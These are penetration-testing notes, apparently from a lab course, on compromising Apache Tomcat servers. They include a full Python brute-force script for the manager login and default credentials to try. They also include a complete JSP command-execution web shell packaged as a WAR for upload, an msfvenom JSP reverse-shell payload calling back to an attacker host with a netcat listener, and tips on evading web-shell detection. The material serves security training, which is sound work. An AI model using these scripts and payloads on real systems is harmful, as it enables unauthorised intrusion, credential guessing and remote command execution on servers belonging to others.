# Tomcat Attacks

### Discovery/Footprinting

```shell-session
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```

* general folder structure of a Tomcat installation.

```shell-session
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

* The `bin` folder stores scripts and binaries needed to start and run a Tomcat server
* The `conf` folder stores various configuration files used by Tomcat.
* The `tomcat-users.xml` file stores user credentials and their assigned roles.
* The `lib` folder holds the various JAR files needed for the correct functioning of Tomcat. The `logs` and `temp` folders store temporary log files.
* The `webapps` folder is the default webroot of Tomcat and hosts all the applications.
* The `work` folder acts as a cache and is used to store data during runtime.
* Each folder inside `webapps` is expected to have the following structure.

```shell-session
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class 
```

* The most important file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor
* This file stores information about the routes used by the application and the classes handling these routes
* All compiled classes used by the application should be stored in the `WEB-INF/classes` folder.
* These classes might contain important business logic as well as sensitive information
* Any vulnerability in these files can lead to total compromise of the website.
* The `lib` folder stores the libraries needed by that particular application.
* The `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), formerly known as `JavaServer Pages`, which can be compared to PHP files on an Apache server.
* Here’s an example web.xml file.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   
```

* The `web.xml` configuration above defines a new servlet named `AdminServlet` that is mapped to the class `com.inlanefreight.api.AdminServlet`.
* Java uses the dot notation to create package names, meaning the path on disk for the class defined above would be:
  * `classes/com/inlanefreight/api/AdminServlet.class`
* Next, a new servlet mapping is created to map requests to `/admin` with `AdminServlet`
  * This configuration will send any request received for `/admin` to the `AdminServlet.class` class for processing.
* The `web.xml` descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability.
* The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.

```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>
```

* The file shows us what each of the roles `manager-gui`, `manager-script`, `manager-jmx`, and `manager-status` provide access to.
* In this example, we can see that a user `tomcat` with the password `tomcat` has the `manager-gui` role, and a second weak password `admin` is set for the user account `admin`

### Enumeration

* After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the `/manager` and the `/host-manager` pages
* We can attempt to locate these with a tool such as `Gobuster` or just browse directly to them.

```shell-session
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
```

* We may be able to either log in to one of these using weak credentials such as `tomcat:tomcat`, `admin:admin`, etc
* If these first few tries don't work, we can try a password brute force attack against the login page, covered in the next section.
* If we are successful in logging in, we can upload a [Web Application Resource or Web Application ARchive (WAR)](https://en.wikipedia.org/wiki/WAR_\(file_format\)) file containing a JSP web shell and obtain remote code execution on the Tomcat server.

### Attacking Tomcat

* if we can access the `/manager` or `/host-manager` endpoints, we can likely achieve remote code execution on the Tomcat server

#### Tomcat Manager - Login Brute Force

* We can use the [auxiliary/scanner/http/tomcat\_mgr\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/)

```
set VHOST web01.inlanefreight.local

set RPORT 8180

set stop_on_success true

set rhosts 10.129.201.58

```

```
run 
```

* We can also use [this](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) Python script to achieve the same result.

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```

* This is a very straightforward script that takes a few arguments. We can run the script with `-h` to see what it requires to run.

```shell-session
python3 mgr_brute.py  -h
```

```shell-session
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

#### Tomcat Manager - WAR File Upload

* Many Tomcat installations provide a GUI interface to manage the application
  * This interface is available at `/manager/html` by default, which only users assigned the `manager-gui` role are allowed to access.
* Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application.
* A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.
* browse to `http://web01.inlanefreight.local:8180/manager/html` and enter the credentials.

<figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

* The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility
* A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.

```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

```shell-session
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
```

```shell-session
zip -r backup.war cmd.jsp 
```

* Click on `Browse` to select the .war file and then click on `Deploy`.

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

* This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table.&#x20;

<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

* &#x20;Browsing to `http://web01.inlanefreight.local:8180/backup/cmd.jsp`
  * &#x20;will present us with a web shell that we can use to run commands on the Tomcat server

```shell-session
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

**Using Metasploit**

* We could also use `msfvenom` to generate a malicious WAR file.
* The payload [java/jsp\_shell\_reverse\_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file.
* Browse to the Tomcat console and deploy this file.
* Tomcat automatically extracts the WAR file contents and deploys it.

```shell-session
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

* Start a Netcat listener and click on `/backup` to execute the shell.

```shell-session
nc -lnvp 4443
```

* The [multi/http/tomcat\_mgr\_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate the process shown above

#### cmd.jsp

* [This](https://github.com/SecurityRiskAdvisors/cmd.jsp) JSP web shell is very lightweight (under 1kb) and utilizes a [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface
* Without it, browsing to an uploaded `cmd.jsp` would render nothing.
* This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit).

<br>
